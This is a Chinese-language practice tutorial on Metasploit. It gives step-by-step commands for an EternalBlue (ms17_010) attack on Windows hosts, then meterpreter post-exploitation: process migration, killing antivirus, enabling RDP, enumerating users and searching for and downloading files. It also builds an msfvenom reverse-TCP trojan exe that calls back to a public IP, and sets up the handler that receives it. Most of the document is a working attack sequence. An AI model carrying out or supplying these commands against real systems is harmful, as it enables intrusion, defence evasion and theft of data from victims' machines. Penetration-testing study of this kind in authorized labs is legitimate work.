# msfvenom练习

msfvenom是msfpayload,msfencode的结合体,它的优点是单一,命令行,和效率.利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线

## 1、msf基本功能

渗透攻击（Exploit）

渗透攻击是指由攻击者或者渗透测试者利用系统、应用或服务中的安全漏洞，所进行的攻击行为。

流行的攻击技术包括：缓冲区溢出、Web应用程序漏洞攻击，以及利用配置错误等。



攻击载荷（Payload）

攻击载何是我们期望目标系统在被渗透攻击后而执行的代码。在MSF框架中可以自由的选择、传送和植入。比如，反弹式shell是一种从目标主机到攻击主机创建网络连接，并提供命令行shell的攻击载荷。bind shell攻击载荷则在目标主机上将命令行shell绑定到一个打开的监听端口，攻击者可以连接这些端口来取得shell交互。



溢出代码（Shellcode）

shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令后，才会提供一个命令行shell或者Meterpreter shell，这也是shellcode名称的由来。



模块（Module）

在MSF中，一个模块是指MSF框架中所使用的一段软件代码组件。在某些时候，你可能会使用一个渗透攻击模块（Exploit module），也就是用于实际发起渗透攻击的软件组件。而在其它时候，则可能使用一个辅助模块（auxiliary module），用来扫描一些诸如扫描或系统查点的攻击动作。



监听器（Listener）

监听器是MSF中用来等待连入网络连接的组件。举例来说，在目标主机被渗透攻击之后，它可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。

## 2、ms17_010

```
 #进入msf
msfconsole

#数据库搜索ms17-010
search ms17-010

#进入漏洞
use windows/smb/ms17_010_eternalblue

#设置被攻击者的ip
set rhosts 192.168.5.59

#运行
run

#解决乱码
chcp 65001
```



### 搜索攻击载荷

```
search ms17_010
```

![image-20220317135133016](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cu2a1hocj21xs0cgn0o.jpg)

### 永恒之蓝攻击载荷

```
use 2
```

![image-20220317135219561](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cu32l6v1j20n604oaac.jpg)

### 配置的参数

```
options
```

![image-20220317135313535](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cu40f11zj21eo0jc77g.jpg)

#### 设置 目标ip

```
set RHOSTS 172.20.10.3
```

### run攻击

![](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cu6b557sj21bu0u0gtp.jpg)

## 3、meterpreter后渗透

#### 1、ps 查看进程

![image-20220317150505812](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cw6sl5ccj20mh0cktan.jpg)

#### 2、查看当前进程号

```
getpid
```

![image-20220317150602357](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cw7s4exvj205i01jt8j.jpg)

从ps查看的运行进程内找出meterpreter的ipd，可以看到，现在的进程为1104，name为svchost.exe，输入migrate 2844迁移至explorer.exe，因为该进程是一个稳定的应用，然后再使用getpid查看新的进程号

```
meterpreter > migrate 2844
 
[] Migrating from 1104 to 2844...
 
[] Migration completed successfully.
 
meterpreter > getpid
 
Current pid: 2844
 
meterpreter >
```

##### 自动化迁移：run post/windows/manage/migrate

#### 3、系统命令

##### 1）查看目标机的系统信息：sysinfo

![image-20220317150827141](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwaahkemj20dq03qt8r.jpg)

##### 2)查看是否运行在虚拟机上：run post/windows/gather/checkvm

![image-20220317150900266](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwav26ilj20bj021jrc.jpg)

##### 3)查看运行时间：idletime

![image-20220317150921640](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwb8650aj208m00z744.jpg)

##### 4)查看当前权限：getuid

![image-20220317150945615](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwbn7trcj208v01fdfo.jpg)

##### 5)关闭杀毒软件：run killav

![image-20220317151012770](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwc4kc8yj20dx02v0sv.jpg)

##### 6)启动目标机的远程桌面协议RDP（3389）：run post/windows/manage/enable_rdp

![image-20220317151045604](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwcovbfbj20nh03y3yx.jpg)

##### 7)查看多少用户登录目标机：run post/windows/gather/enum_logged_on_users

![image-20220317151137877](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwdlhhxrj20lw0c7aaw.jpg)

##### 8)列举用户安装在系统上的应用程：run post/windows/gather/enum_applications

![image-20220317151204525](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwe26yfkj20mh08z75c.jpg)

#### 4、文件系统命令

##### 1)查看当前属于目标机的工作目录的路径名称：pwd

![image-20220317151307788](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwf5fu3aj2045011q2q.jpg)



##### 2)查看当前处于本地的哪个目录：getlwd

![image-20220317151400310](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwg2bc8bj204900sa9u.jpg)

##### 3)列出当前目录的所有文件：ls

![image-20220317151455621](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwh114rnj20g90h7dje.jpg)

##### 4)查看目标1.txt文件内内容：cat 1.txt



##### 5)搜寻、拷贝、上传文件至目标（需要拥有system权限，可以利用getsystem、MS16-032漏洞进行提权）

搜寻c盘内所有以txt为后缀的文件：`search -f *.txt -d c:\`

拷贝文件至kali内：`download c:\1.txt /root`
上传文件至win7C盘目录下：`upload /home/zidian/msfadmin.txt c:\ `

## 4、生成exe木马

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=212.129.238.18 LPORT=4444 -f exe -o 123.exe
```

212.129.238.18是攻击者的监听机器，4444是被攻击机器监听端口

### 开启kali监听

启动msfconsole

![image-20220317151928134](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwlr427jj20hg0gkta3.jpg)

#### 开启监听

```
use exploit/multi/handler
```



#### 设置tcp监听

```
set payload windows/meterpreter/reverse_tcp

set lhost 212.129.238.18
```

![image-20220317152306277](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwpjmmdoj20uk0e640c.jpg)



#### 输入explore开始监听

### 木马上线

当被攻击的机器（我的是windows xp）点击生成的123.exe木马时，即可以监听到木马上线

![image-20220317152638860](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0d12z9r3uj217009st9y.jpg)

